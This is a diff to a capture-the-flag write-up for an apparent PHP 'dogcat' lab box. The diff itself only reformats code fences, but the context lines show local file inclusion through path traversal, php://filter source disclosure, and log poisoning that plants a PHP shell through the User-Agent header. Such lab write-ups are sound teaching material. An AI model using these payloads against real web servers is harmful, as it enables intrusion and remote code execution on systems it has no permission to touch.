@@ -112,7 +112,7 @@ So we know the page requires us to include dog (or cat) in the view-parameter of
 
 We know the website is served using apache 2.4.38 (from opening /server-status and running nmap) so we could have a look at well known apache files e.g. the log files. Just to be safe, fell free to add as many ../ as you want :D
 
-```html
+ ```html
 ?view=./cat/../../../../../../../../var/log/apache2/access.log
 ```
 
@@ -125,7 +125,7 @@ Based on how we can manipulate the view parameter, this page may be vulnerable t
 With 'php://filter/convert.base64-encode/resource=' we can convert the given resource to base64
 With './cat/../index' we add they keyword cat and move back to the main web folder and choose index.php
 
-```html
+ ```html
 ?view=php://filter/convert.base64-encode/resource=./cat/../index
 ```
 
@@ -137,7 +137,7 @@ echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT
 
 The index.php looks as follows:
 
-```html
+ ```html
 <!DOCTYPE HTML>
 <html>
 <head>
@@ -173,7 +173,7 @@ The interesting line here is ```$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.ph
 
 Now lets try looking at the apache2 access.log files again (this time with the "ext" parameter):
 
-```html
+ ```html
 ?view=./cat/../../../../../../../../var/log/apache2/access&ext=.log
 ```
 
@@ -181,7 +181,7 @@ Success! We can see the logs (our visits). The logs basically contain the URL re
 
 If you feel lucky, you could've guessed that there is a flag.php in the main folder of the website and try view this by misusing the view? parameter as follows:
 
-```html
+ ```html
 ?view=php://filter/convert.base64-encode/resource=./cat/../flag
 ```
 
@@ -197,9 +197,9 @@ However, this was a lucky guess... maybe there is another way to get there...
 
 We can try to inject PHP code to the access.log and trigger the code by visiting the page. Remember from above, there are two things we can manipulate at request time that are written to the logs, the URL request including parameters and the user-agent. Let's try running a request e.g.:
 
-```html
+ ```html
 ?view=./cat/../../<?php echo "HI!";?>
-```html
+ ```html
 
 Unfortunantly this fails as e.g. all spaces are URL encoded. However, there are clear spaces visible in the user-agent. Let's try to change the user-agent string:
 
@@ -247,7 +247,7 @@ print (requests.get('http://10.10.46.238/?view=cat', headers={'User-Agent': '<?p
 
 Use the previous technique to include the access log again:
 
-```html
+ ```html
 ?view=./cat/../../../../../../../../var/log/apache2/access&ext=.log
 ```
 
@@ -255,7 +255,7 @@ You should not see our injected agent string because the injected php code is in
 
 We can now start the shell.php located in the the main web folder:
 
-```html
+ ```html
 ?view=./cat/../shell
 ```
 
@@ -270,7 +270,7 @@ var/www/flag2_QMW7JvaY2LvK.txt
 
 Btw, it is possible to view flag2 within the browser and without reverse shell:
 
-```html
+ ```html
 ?view=./dog/../../../../../var/www/flag2_QMW7JvaY2LvK&ext=.txt
 ```
 
